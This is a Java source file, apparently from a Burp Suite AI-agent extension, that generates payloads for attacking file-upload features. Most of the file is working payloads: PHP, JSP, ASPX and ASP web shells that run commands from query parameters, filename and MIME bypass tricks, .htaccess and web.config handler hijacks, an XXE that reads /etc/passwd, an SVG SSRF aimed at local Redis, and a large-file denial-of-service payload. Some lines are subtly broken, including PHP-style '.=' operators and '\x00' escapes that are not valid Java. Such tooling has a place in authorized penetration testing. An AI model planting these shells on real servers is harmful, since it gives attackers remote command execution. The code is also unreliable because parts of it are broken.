package com.burpai.agent.payloads;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

/**
 * Professional File Upload Payload Generator
 * 
 * Generates comprehensive payloads for testing arbitrary file upload vulnerabilities.
 * Covers web shells, bypass techniques, double extensions, MIME type spoofing,
 * null byte injections, and many other attack vectors.
 * 
 * IMPORTANT: This tool is for authorized security testing only.
 */
public class FileUploadPayloadGenerator {
    
    private static final Random random = new Random();
    
    // Payload categories
    public enum PayloadType {
        WEB_SHELL_PHP,
        WEB_SHELL_JSP,
        WEB_SHELL_ASPX,
        WEB_SHELL_ASHELL,
        IMAGE_EMBEDDED_PHP,
        IMAGE_EMBEDDED_JSP,
        POLYGLOT,
        DOUBLE_EXTENSION,
        NULL_BYTE_INJECTION,
        HTACCESS_ATTACK,
        CONFIG_INJECTION,
        MIME_SPOOFING,
        SPECIAL_CHARACTERS,
        UNICODE_BYPASS,
        LARGE_FILE,
        XML_EXTERNAL_ENTITY,
        WEBDAV_PUT,
        ARCHIVE_EXPLOITATION,
        SSRF_VIA_UPLOAD
    }
    
    /**
     * Generate all file upload payloads
     */
    public static List<FileUploadPayload> generateAllPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // Web shell payloads
        payloads.addAll(generateWebShellPayloads());
        
        // Image embedded payloads
        payloads.addAll(generateImageEmbeddedPayloads());
        
        // Polyglot payloads
        payloads.addAll(generatePolyglotPayloads());
        
        // Double extension bypass
        payloads.addAll(generateDoubleExtensionPayloads());
        
        // Null byte injection
        payloads.addAll(generateNullBytePayloads());
        
        // .htaccess attacks
        payloads.addAll(generateHtaccessPayloads());
        
        // Config injection
        payloads.addAll(generateConfigInjectionPayloads());
        
        // MIME spoofing
        payloads.addAll(generateMimeSpoofingPayloads());
        
        // Special characters bypass
        payloads.addAll(generateSpecialCharPayloads());
        
        // Unicode bypass
        payloads.addAll(generateUnicodeBypassPayloads());
        
        // Large file (DoS)
        payloads.add(generateLargeFilePayload());
        
        // XXE via XML upload
        payloads.add(generateXXEPayload());
        
        // WebDAV PUT
        payloads.add(generateWebDAVPayload());
        
        // Archive exploitation
        payloads.addAll(generateArchiveExploitationPayloads());
        
        // SSRF via upload
        payloads.add(generateSSRFViaUploadPayload());
        
        return payloads;
    }
    
    /**
     * Generate web shell payloads
     */
    private static List<FileUploadPayload> generateWebShellPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // PHP Web Shells - Multiple variations
        payloads.add(new FileUploadPayload(
                "shell.php",
                "image/jpeg",
                generatePHPWebShellBasic(),
                "Basic PHP Web Shell",
                PayloadType.WEB_SHELL_PHP
        ));
        
        payloads.add(new FileUploadPayload(
                "upload.php",
                "image/png",
                generatePHPWebShellObfuscated(),
                "Obfuscated PHP Web Shell",
                PayloadType.WEB_SHELL_PHP
        ));
        
        payloads.add(new FileUploadPayload(
                "img.php.jpg",
                "image/gif",
                generatePHPWebShellBasic(),
                "PHP Shell with Double Extension",
                PayloadType.WEB_SHELL_PHP
        ));
        
        // PHP with system() function
        payloads.add(new FileUploadPayload(
                "cmd.php",
                "application/x-php",
                generatePHPSystemShell(),
                "PHP System Shell",
                PayloadType.WEB_SHELL_PHP
        ));
        
        // PHP with eval()
        payloads.add(new FileUploadPayload(
                "eval.php",
                "text/plain",
                generatePHPEvalShell(),
                "PHP Eval Shell",
                PayloadType.WEB_SHELL_PHP
        ));
        
        // PHP with base64 encoding
        payloads.add(new FileUploadPayload(
                "b64.php",
                "text/plain",
                generatePHPBase64Shell(),
                "Base64 Encoded PHP Shell",
                PayloadType.WEB_SHELL_PHP
        ));
        
        // PHP with variable functions
        payloads.add(new FileUploadPayload(
                "vfunc.php",
                "image/jpeg",
                generatePHPVariableFunctionShell(),
                "PHP Variable Function Shell",
                PayloadType.WEB_SHELL_PHP
        ));
        
        // JSP Web Shells
        payloads.add(new FileUploadPayload(
                "shell.jsp",
                "image/jpeg",
                generateJSPWebShell(),
                "JSP Web Shell",
                PayloadType.WEB_SHELL_JSP
        ));
        
        payloads.add(new FileUploadPayload(
                "cmd.jsp",
                "application/x-jsp",
                generateJSPSystemShell(),
                "JSP System Shell",
                PayloadType.WEB_SHELL_JSP
        ));
        
        // ASPX Web Shells
        payloads.add(new FileUploadPayload(
                "shell.aspx",
                "image/jpeg",
                generateASPXWebShell(),
                "ASPX Web Shell",
                PayloadType.WEB_SHELL_ASPX
        ));
        
        payloads.add(new FileUploadPayload(
                "cmd.aspx",
                "text/plain",
                generateASPXSystemShell(),
                "ASPX System Shell",
                PayloadType.WEB_SHELL_ASPX
        ));
        
        // ASP Classic
        payloads.add(new FileUploadPayload(
                "shell.asp",
                "image/gif",
                generateASPWebShell(),
                "ASP Classic Web Shell",
                PayloadType.WEB_SHELL_ASHELL
        ));
        
        return payloads;
    }
    
    /**
     * Generate image-embedded payload (steganography-style)
     */
    private static List<FileUploadPayload> generateImageEmbeddedPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // GIF89a with embedded PHP
        payloads.add(new FileUploadPayload(
                "shell.php.gif",
                "image/gif",
                "GIF89a" + generatePHPWebShellBasic(),
                "GIF Header + PHP Code",
                PayloadType.IMAGE_EMBEDDED_PHP
        ));
        
        // JPEG header + PHP
        payloads.add(new FileUploadPayload(
                "image.jpg.php",
                "image/jpeg",
                "\u00FF\u00D8\u00FF\u00E0" + generatePHPWebShellBasic(),
                "JPEG Header + PHP Code",
                PayloadType.IMAGE_EMBEDDED_PHP
        ));
        
        // PNG header + PHP
        payloads.add(new FileUploadPayload(
                "pic.png.php",
                "image/png",
                "\u0089PNG\r\n\u001A\n" + generatePHPWebShellBasic(),
                "PNG Header + PHP Code",
                PayloadType.IMAGE_EMBEDDED_PHP
        ));
        
        // GIF with JSP
        payloads.add(new FileUploadPayload(
                "shell.jsp.gif",
                "image/gif",
                "GIF89a<%@ page import='java.io.*' %><%Runtime.getRuntime().exec(request.getParameter('c'));%>",
                "GIF Header + JSP Code",
                PayloadType.IMAGE_EMBEDDED_JSP
        ));
        
        return payloads;
    }
    
    /**
     * Generate polyglot payloads
     */
    private static List<FileUploadPayload> generatePolyglotPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // GIF + PHP polyglot
        String gifPhp = "GIF89a" + 
                "<script language='php'>system($_GET['cmd']);</script>";
        payloads.add(new FileUploadPayload(
                "polyglot.php.gif",
                "image/gif",
                gifPhp,
                "GIF + PHP Polyglot",
                PayloadType.POLYGLOT
        ));
        
        // JPEG + PHP polyglot (magic bytes)
        String jpegPhp = "\u00FF\u00D8\u00FF\u00E0<?php system($_GET['cmd']); ?>";
        payloads.add(new FileUploadPayload(
                "polyglot.php.jpg",
                "image/jpeg",
                jpegPhp,
                "JPEG + PHP Polyglot",
                PayloadType.POLYGLOT
        ));
        
        // PHP + JSP polyglot
        String phpJsp = "<% /* <?php system($_GET['c']); ?> */ %>" +
                "<%@ page import='java.io.*' %>" +
                "<%Runtime.getRuntime().exec(request.getParameter('c'));%>";
        payloads.add(new FileUploadPayload(
                "polyglot.jsp.php",
                "text/plain",
                phpJsp,
                "PHP + JSP Polyglot",
                PayloadType.POLYGLOT
        ));
        
        return payloads;
    }
    
    /**
     * Generate double extension bypass payloads
     */
    private static List<FileUploadPayload> generateDoubleExtensionPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        String[] extensions = {"php", "php5", "php7", "phtml", "pht", "phps", "inc"};
        String[] imageExts = {"jpg", "jpeg", "png", "gif", "bmp"};
        String phpCode = generatePHPWebShellBasic();
        
        for (String ext : extensions) {
            for (String imgExt : imageExts) {
                payloads.add(new FileUploadPayload(
                        "shell." + imgExt + "." + ext,
                        "image/" + imgExt,
                        phpCode,
                        "Double Extension: " + imgExt + "." + ext,
                        PayloadType.DOUBLE_EXTENSION
                ));
            }
        }
        
        // Multiple extensions
        payloads.add(new FileUploadPayload(
                "file.php.jpg.php",
                "image/jpeg",
                phpCode,
                "Triple Extension",
                PayloadType.DOUBLE_EXTENSION
        ));
        
        payloads.add(new FileUploadPayload(
                "shell.jpg.php5",
                "image/jpeg",
                phpCode,
                "Double Extension with PHP5",
                PayloadType.DOUBLE_EXTENSION
        ));
        
        return payloads;
    }
    
    /**
     * Generate null byte injection payloads
     */
    private static List<FileUploadPayload> generateNullBytePayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // Note: In Java 8, we can't actually include null bytes in strings properly
        // These payloads represent the concept
        
        String phpCode = generatePHPWebShellBasic();
        
        payloads.add(new FileUploadPayload(
                "shell.php%00.jpg",
                "image/jpeg",
                phpCode,
                "Null Byte Injection (URL encoded)",
                PayloadType.NULL_BYTE_INJECTION
        ));
        
        payloads.add(new FileUploadPayload(
                "file.php\x00.jpg",
                "image/jpeg",
                phpCode,
                "Null Byte Injection (raw)",
                PayloadType.NULL_BYTE_INJECTION
        ));
        
        payloads.add(new FileUploadPayload(
                "upload.php%00.png",
                "image/png",
                phpCode,
                "Null Byte with PNG",
                PayloadType.NULL_BYTE_INJECTION
        ));
        
        return payloads;
    }
    
    /**
     * Generate .htaccess attack payloads
     */
    private static List<FileUploadPayload> generateHtaccessPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // Execute .jpg as PHP
        String htaccess1 = "<FilesMatch \"\\.jpg$\">\n" +
                "SetHandler application/x-httpd-php\n" +
                "</FilesMatch>";
        payloads.add(new FileUploadPayload(
                ".htaccess",
                "text/plain",
                htaccess1,
                "Execute .jpg as PHP",
                PayloadType.HTACCESS_ATTACK
        ));
        
        // Execute any file with .gif extension
        String htaccess2 = "AddType application/x-httpd-php .gif";
        payloads.add(new FileUploadPayload(
                ".htaccess",
                "application/octet-stream",
                htaccess2,
                "Execute .gif as PHP",
                PayloadType.HTACCESS_ATTACK
        ));
        
        // PHP source disclosure
        String htaccess3 = "RemoveHandler .php";
        payloads.add(new FileUploadPayload(
                ".htaccess",
                "text/plain",
                htaccess3,
                "PHP Source Disclosure",
                PayloadType.HTACCESS_ATTACK
        ));
        
        // Directory listing
        String htaccess4 = "Options +Indexes";
        payloads.add(new FileUploadPayload(
                ".htaccess",
                "text/plain",
                htaccess4,
                "Enable Directory Listing",
                PayloadType.HTACCESS_ATTACK
        ));
        
        // SSI execution
        String htaccess5 = "AddHandler server-parsed .html";
        payloads.add(new FileUploadPayload(
                ".htaccess",
                "text/plain",
                htaccess5,
                "Enable SSI on HTML",
                PayloadType.HTACCESS_ATTACK
        ));
        
        return payloads;
    }
    
    /**
     * Generate config injection payloads
     */
    private static List<FileUploadPayload> generateConfigInjectionPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // web.config for IIS
        String webConfig = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<configuration>\n" +
                "  <system.webServer>\n" +
                "    <handlers accessPolicy=\"Read, Script, Execute\">\n" +
                "      <add name=\"ASP\" path=\"*.jpg\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"None\" />\n" +
                "    </handlers>\n" +
                "    <security>\n" +
                "      <requestFiltering>\n" +
                "        <fileExtensions allowUnlisted=\"true\" />\n" +
                "      </requestFiltering>\n" +
                "    </security>\n" +
                "  </system.webServer>\n" +
                "</configuration>";
        
        payloads.add(new FileUploadPayload(
                "web.config",
                "text/xml",
                webConfig,
                "IIS Web Config - Execute .jpg as ASP",
                PayloadType.CONFIG_INJECTION
        ));
        
        // web.config with PHP handler
        String webConfig2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<configuration>\n" +
                "  <system.webServer>\n" +
                "    <handlers>\n" +
                "      <add name=\"PHP_via_FastCGI\" path=\"*.jpg\" verb=\"*\" modules=\"FastCgiModule\" scriptProcessor=\"C:\\php\\php-cgi.exe\" resourceType=\"Unspecified\" />\n" +
                "    </handlers>\n" +
                "  </system.webServer>\n" +
                "</configuration>";
        
        payloads.add(new FileUploadPayload(
                "web.config",
                "text/xml",
                webConfig2,
                "IIS Web Config - Execute .jpg as PHP",
                PayloadType.CONFIG_INJECTION
        ));
        
        // user.ini for PHP-FPM
        String userIni = "auto_prepend_file = uploaded_shell.php";
        payloads.add(new FileUploadPayload(
                ".user.ini",
                "text/plain",
                userIni,
                "PHP-FPM user.ini - Auto prepend file",
                PayloadType.CONFIG_INJECTION
        ));
        
        return payloads;
    }
    
    /**
     * Generate MIME spoofing payloads
     */
    private static List<FileUploadPayload> generateMimeSpoofingPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        String phpCode = generatePHPWebShellBasic();
        
        payloads.add(new FileUploadPayload(
                "shell.php",
                "image/jpeg",
                phpCode,
                "PHP with JPEG MIME",
                PayloadType.MIME_SPOOFING
        ));
        
        payloads.add(new FileUploadPayload(
                "cmd.php",
                "image/png",
                phpCode,
                "PHP with PNG MIME",
                PayloadType.MIME_SPOOFING
        ));
        
        payloads.add(new FileUploadPayload(
                "shell.php5",
                "application/octet-stream",
                phpCode,
                "PHP with Octet-stream MIME",
                PayloadType.MIME_SPOOFING
        ));
        
        payloads.add(new FileUploadPayload(
                "file.php",
                "text/plain",
                phpCode,
                "PHP with Text MIME",
                PayloadType.MIME_SPOOFING
        ));
        
        payloads.add(new FileUploadPayload(
                "upload.php",
                "application/x-shockwave-flash",
                phpCode,
                "PHP with Flash MIME",
                PayloadType.MIME_SPOOFING
        ));
        
        return payloads;
    }
    
    /**
     * Generate special character bypass payloads
     */
    private static List<FileUploadPayload> generateSpecialCharPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        String phpCode = generatePHPWebShellBasic();
        
        String[] specialFilenames = {
                "shell.pHp",
                "file.PHP",
                "cmd.Php5",
                "upload.php.",
                "shell.php ",
                "file.php::$DATA",
                "shell.php%20",
                "upload.php%2ejpg",
                "file.php%00",
                "shell.asp.jpg"
        };
        
        for (String filename : specialFilenames) {
            payloads.add(new FileUploadPayload(
                    filename,
                    "image/jpeg",
                    phpCode,
                    "Special Character: " + filename,
                    PayloadType.SPECIAL_CHARACTERS
            ));
        }
        
        // Multiple dots
        payloads.add(new FileUploadPayload(
                "file...php",
                "image/jpeg",
                phpCode,
                "Multiple Dots",
                PayloadType.SPECIAL_CHARACTERS
        ));
        
        // Trailing slash
        payloads.add(new FileUploadPayload(
                "shell.php/",
                "image/jpeg",
                phpCode,
                "Trailing Slash",
                PayloadType.SPECIAL_CHARACTERS
        ));
        
        return payloads;
    }
    
    /**
     * Generate Unicode bypass payloads
     */
    private static List<FileUploadPayload> generateUnicodeBypassPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        String phpCode = generatePHPWebShellBasic();
        
        // Unicode characters that may bypass filters
        String[] unicodeFilenames = {
                "shell\u0000.php",
                "file\u202e.php",
                "shell\u202d.php",
                "upload\uff0e.php",
                "shell\uff0ejpg"
        };
        
        for (String filename : unicodeFilenames) {
            payloads.add(new FileUploadPayload(
                    filename,
                    "image/jpeg",
                    phpCode,
                    "Unicode Bypass: " + filename,
                    PayloadType.UNICODE_BYPASS
            ));
        }
        
        return payloads;
    }
    
    /**
     * Generate large file payload (DoS)
     */
    private static FileUploadPayload generateLargeFilePayload() {
        // Generate 10MB of random data
        StringBuilder largeContent = new StringBuilder();
        for (int i = 0; i < 100000; i++) {
            largeContent.append("A".repeat(100)); // 100 chars * 100000 = 10MB
        }
        
        return new FileUploadPayload(
                "large.txt",
                "text/plain",
                largeContent.toString(),
                "Large File (DoS) - 10MB",
                PayloadType.LARGE_FILE
        );
    }
    
    /**
     * Generate XXE payload via XML upload
     */
    private static FileUploadPayload generateXXEPayload() {
        String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [ \n" +
                "  <!ELEMENT foo ANY >\n" +
                "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n" +
                "<foo>&xxe;</foo>";
        
        return new FileUploadPayload(
                "xxe.xml",
                "text/xml",
                xxePayload,
                "XXE - Read /etc/passwd",
                PayloadType.XML_EXTERNAL_ENTITY
        );
    }
    
    /**
     * Generate WebDAV PUT payload
     */
    private static FileUploadPayload generateWebDAVPayload() {
        String phpCode = generatePHPWebShellBasic();
        
        return new FileUploadPayload(
                "shell.php",
                "application/octet-stream",
                phpCode,
                "WebDAV PUT Method Upload",
                PayloadType.WEBDAV_PUT
        );
    }
    
    /**
     * Generate archive exploitation payloads
     */
    private static List<FileUploadPayload> generateArchiveExploitationPayloads() {
        List<FileUploadPayload> payloads = new ArrayList<>();
        
        // ZIP file with embedded shell (simulated with header)
        String zipHeader = "PK\x03\x04"; // ZIP magic bytes
        String phpCode = generatePHPWebShellBasic();
        
        payloads.add(new FileUploadPayload(
                "archive.zip",
                "application/zip",
                zipHeader + phpCode,
                "ZIP Archive with Embedded Shell",
                PayloadType.ARCHIVE_EXPLOITATION
        ));
        
        // TAR file
        String tarHeader = ""; // TAR doesn't have magic bytes
        payloads.add(new FileUploadPayload(
                "archive.tar",
                "application/x-tar",
                tarHeader + phpCode,
                "TAR Archive with Embedded Shell",
                PayloadType.ARCHIVE_EXPLOITATION
        ));
        
        // RAR file
        String rarHeader = "Rar!\x1A\x07\x00"; // RAR magic bytes
        payloads.add(new FileUploadPayload(
                "archive.rar",
                "application/x-rar-compressed",
                rarHeader + phpCode,
                "RAR Archive with Embedded Shell",
                PayloadType.ARCHIVE_EXPLOITATION
        ));
        
        return payloads;
    }
    
    /**
     * Generate SSRF via file upload payload
     */
    private static FileUploadPayload generateSSRFViaUploadPayload() {
        // SVG with XXE/SSRF
        String svgPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE svg [\n" +
                "  <!ENTITY xxe SYSTEM \"http://127.0.0.1:6379/INFO\" >]>\n" +
                "<svg xmlns=\"http://www.w3.org/2000/svg\">\n" +
                "  <text>&xxe;</text>\n" +
                "</svg>";
        
        return new FileUploadPayload(
                "ssrf.svg",
                "image/svg+xml",
                svgPayload,
                "SSRF via SVG XXE - Local Redis",
                PayloadType.SSRF_VIA_UPLOAD
        );
    }
    
    // ================== Web Shell Code Generators ==================
    
    private static String generatePHPWebShellBasic() {
        return "<?php system($_GET['cmd']); ?>";
    }
    
    private static String generatePHPWebShellObfuscated() {
        // Simple obfuscation
        String shell = "$_='';$_[+$_]=''";
        shell .= "($_=$_[+$_]|$[+$_]).($_[+$_]|$[+$_]).($_[+$_]|$[+$_])";
        shell .= ";$_='';$_[+$_]=''";
        shell .= ";$_=$_[+$_].$_[+$_].$_[+$_].($_[+$_]|$[+$_]).$_[+$_];";
        shell += "<?php @$_($_[+$_]($_[+$_])); ?>";
        return shell;
    }
    
    private static String generatePHPSystemShell() {
        return "<?php if(isset($_GET['c'])) { system($_GET['c']); } ?>";
    }
    
    private static String generatePHPEvalShell() {
        return "<?php if(isset($_GET['c'])) { eval($_GET['c']); } ?>";
    }
    
    private static String generatePHPBase64Shell() {
        String cmdShell = "system($_GET['cmd']);";
        String encoded = java.util.Base64.getEncoder().encodeToString(cmdShell.getBytes());
        return "<?php eval(base64_decode('" + encoded + "')); ?>";
    }
    
    private static String generatePHPVariableFunctionShell() {
        return "<?php $a='sys'.'tem';$a($_GET['c']); ?>";
    }
    
    private static String generateJSPWebShell() {
        return "<%@ page import='java.io.*' %>\n" +
                "<%\n" +
                "  String cmd = request.getParameter('c');\n" +
                "  if(cmd != null) {\n" +
                "    Process p = Runtime.getRuntime().exec(cmd);\n" +
                "    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n" +
                "    String line;\n" +
                "    while((line = br.readLine()) != null) {\n" +
                "      out.println(line);\n" +
                "    }\n" +
                "  }\n" +
                "%>";
    }
    
    private static String generateJSPSystemShell() {
        return "<%@ page import='java.io.*' %>\n" +
                "<%\n" +
                "  Runtime.getRuntime().exec(request.getParameter('c'));\n" +
                "%>";
    }
    
    private static String generateASPXWebShell() {
        return "<%@ Page Language='C#' %>\n" +
                "<%@ Import Namespace='System.Diagnostics' %>\n" +
                "<script runat='server'>\n" +
                "  void Page_Load(object sender, EventArgs e) {\n" +
                "    string cmd = Request.QueryString['c'];\n" +
                "    if (!string.IsNullOrEmpty(cmd)) {\n" +
                "      Process.Start(new ProcessStartInfo {\n" +
                "        FileName = 'cmd.exe',\n" +
                "        Arguments = '/c ' + cmd,\n" +
                "        UseShellExecute = false,\n" +
                "        RedirectStandardOutput = true\n" +
                "      });\n" +
                "    }\n" +
                "  }\n" +
                "</script>";
    }
    
    private static String generateASPXSystemShell() {
        return "<%@ Page Language='C#' %>\n" +
                "<%@ Import Namespace='System.Diagnostics' %>\n" +
                "<script runat='server'>\n" +
                "  void Page_Load(object sender, EventArgs e) {\n" +
                "    string cmd = Request.QueryString['c'];\n" +
                "    if (!string.IsNullOrEmpty(cmd)) {\n" +
                "      Process proc = new Process();\n" +
                "      proc.StartInfo.FileName = 'cmd.exe';\n" +
                "      proc.StartInfo.Arguments = '/c ' + cmd;\n" +
                "      proc.StartInfo.UseShellExecute = false;\n" +
                "      proc.Start();\n" +
                "    }\n" +
                "  }\n" +
                "</script>";
    }
    
    private static String generateASPWebShell() {
        return "<%\n" +
                "  Dim cmd\n" +
                "  cmd = Request.QueryString('c')\n" +
                "  If cmd <> '' Then\n" +
                "    Response.Write Server.CreateObject('WScript.Shell').Exec(cmd).StdOut.ReadAll\n" +
                "  End If\n" +
                "%>";
    }
    
    /**
     * File Upload Payload Model
     */
    public static class FileUploadPayload {
        private String filename;
        private String contentType;
        private String content;
        private String description;
        private PayloadType type;
        
        public FileUploadPayload(String filename, String contentType, String content, 
                                  String description, PayloadType type) {
            this.filename = filename;
            this.contentType = contentType;
            this.content = content;
            this.description = description;
            this.type = type;
        }
        
        // Getters
        public String getFilename() { return filename; }
        public String getContentType() { return contentType; }
        public String getContent() { return content; }
        public String getDescription() { return description; }
        public PayloadType getType() { return type; }
        
        @Override
        public String toString() {
            return String.format("[%s] %s (%s) - %s", type, filename, contentType, description);
        }
    }
}
